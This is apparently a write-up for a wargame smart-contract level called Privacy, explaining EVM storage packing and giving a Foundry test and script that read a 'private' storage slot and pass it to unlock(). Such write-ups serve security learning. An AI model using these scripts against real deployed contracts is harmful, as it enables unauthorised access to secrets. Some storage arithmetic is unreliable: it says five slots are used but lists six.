## 🎯 Objective:
- The contracts objective is to read data from a private variable.
- And to know about the storage architecture of EVM.
---
## 📄 Contracts Overview
---
### Privacy 
---
- This contract have 6 important variable and 1 constructor.
	- `locked`: public visibility
	- `ID`: public visibility
	- `flattening`: private visibility
	- `denomination`: private visibility
	- `awkwardness`: private visibility
	- `private`: private visibility
	- Constructor: It accepts bytes32[3] data as an argument.
---
## 🧠 Vulnerability: Privacy

---
- The core vulnerability of this contract is to misunderstood a private visibility variable as safe way of storing data.
```solidity 
bool public locked = true; 
uint256 public ID = block.timestamp; 
uint8 private flattening = 10; 
uint8 private denomination = 255; 
uint16 private awkwardness = uint16(block.timestamp); 
bytes32[3] private data;
```
- Even though the visibility is set to private but it can still be seen{not the exact stored data} by using different tools and method just like `cast`.
- Understanding storage architecture of EVM can help a lot to understand how and how much bytes each data types require to store data in it.
--- 
### The Storage Architecture:
- In this contract 6 data types are used:
	- `bool`
	- `uint256`
	- `uint8`
	- `uint16`
	- `bytes32[3]`
	- `bytes16`
- Each data types require some bytes to store data in it
- Such as:
	- `bool`: 1 byte(stored as 0 or 1)
	- `uint256/int256`: 32 bytes 
	- `uint8 to uint248`: Scales from 1 byte up to 31 bytes
	- `Fixed byte Array`: bytes1 to bytes32 
- As per the contract the storage:
	- `locked`: 1 byte
	- `ID` : 32 bytes
	- `flattening, denomination, awkwardness`: Collectively uses 4 bytes from 32 bytes {remaining 28 bytes}
	- `data`: as it is an bytes32[3] array so data[0] will use 32 bytes, data[1] will use 32 bytes and data[2] use 32 bytes. Means collectively it data uses 96 bytes.
- So collectively 133. bytes is used in total. In total only 5 slots are used
	- **1st Slot (Slot 0):** `locked`
	- **2nd Slot (Slot 1):** `ID`
	- **3rd Slot (Slot 2):** `flattening` + `denomination` + `awkwardness` (The single packed slot you correctly identified!)
	- **4th Slot (Slot 3):** `data[0]` (First array element)
	- **5th Slot (Slot 4):** `data[1]` (Second array element)
	- **6th Slot (Slot 5):** `data[2]` (Third array element)

---
## Attack Flow:
---
- To exploit this contract the attacker should know about storage architecture, 
```attack
Attacker made a contract that uses a storage payload, it uses vm.load() {a foundry cheat code use to see storage of the contract} it can show the bytes32 data of the array data.
|
V
After getting byte32 of slot 5 then the attacker have to typecast byte32 to byte16 in order to match the condition and the parameter
|
V
After this the locked vaibale will change ot false.
```

---
## 🧪 Test - TestPrivacy.t.sol
---

| TestName                                | WhatitChecks                                                                                                                                                                                                                              |
| --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `testrevertIfPassedRandombytes16Inputs` | It checks random `byte16` values should not unlock the lock and gets `reverts`, its a `fuzz` test that fuzzes multiple random values just to verify the lock only can be opened with a correct `byte16` value and not with random values. |
| `testLockIsUnlock`                      | It checks when a correct `byte16` value is passed then the locked value which was initially true should turn false.                                                                                                                       |

---
### Key exploit(in test):
---
```solidity
function testLockIsUnlock() public {
	//Arrange
	vm.startPrank(spider);
	bool initialLocakedValue;
	bool finalLockedValue;
	bytes32 storageValue = vm.load(address(privacy), bytes32(uint256(5)));
	bytes16 byt16 = bytes16(storageValue);
	//Act
	initialLocakedValue = privacy.locked();
	privacy.unlock(byt16);
	finalLockedValue = privacy.locked();
	//Assert
	assertEq(privacy.locked(), finalLockedValue,"It didnt change teh locked value!");
	
	vm.stopPrank();
}
```
- The exploit in this test file is:
	- `bytes32 storageValue = vm.load(address(privacy), bytes32(uint256(5)));`
	- `bytes16 byt16 = bytes16(storageValue);`
	- The `vm.load() `can see the slot5 that saves it in `bytes32 data` value.
	- Then it type-cast bytes32 to bytes16.
		- Then it can be used as the parameter for the unlock function.
			- which changes the locked variable's value.
			- initially it was `true`.
			- After the exploit it changes to `false`.
---
## 🚀 On-Chain - AttackPrivacy.s.sol
---
```solidity
function run() public {
	bytes32 byte_x = vm.load(privacyAddress, bytes32(uint256(5)));
	bytes16 key = bytes16(byte_x);
	console.log("Extracted Key: ");
	console.logBytes16(key);
	
	vm.startBroadcast();
	Privacy(privacyAddress).unlock(key);
	vm.stopBroadcast();
}
```
- This script Automates
	- This passes `bytes32 byt_x` and use vm.load() to save the data and then type-cast it to `bytes16` to pass it as the parameter for the `unlock` function.
---
## 🛠️ How to Run
---
## Run Tests(Local Anvil)
```bash
forge test --mt testLockIsUnlock -vvvv
```

## Deploy & Attack (On-chain)
```bash 
forge script script/AttackPrivacy.s.sol --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY --broadcast
```
- `vm.load()`: see's the storage slot and saves it 
	- it takes 2 parameter:
		- the address if the contract
		- the storage slot number

- `cast`:  It can also be used after deploying the contract. It is foundry tool that can be used to interact with the contract.
```bash
cast storage <Address_contract> <storage_slot_number> --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY
```

## 📁 Project Structure

```
├── src/
│ └──Privacy.sol #unlock()
├── script/
│ ├── DeployPrivacy.s.sol
│ └── AttackPrivacy.s.sol
└── test/
└── TestPrivacy.t.sol

```